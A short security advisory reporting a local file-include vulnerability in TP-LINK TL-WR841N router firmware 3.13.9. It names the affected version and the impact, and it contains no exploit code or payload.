TP-LINK TL-WR841N router is prone to a local file-include vulnerability because it fails to sufficiently sanitize user-supplied input.

An attacker can exploit this vulnerability to view files and execute local scripts in the context of the affected device. This may aid in further attacks.

TP-LINK TL-WR841N 3.13.9 Build 120201 Rel.54965n is vulnerable; other versions may also be affected.
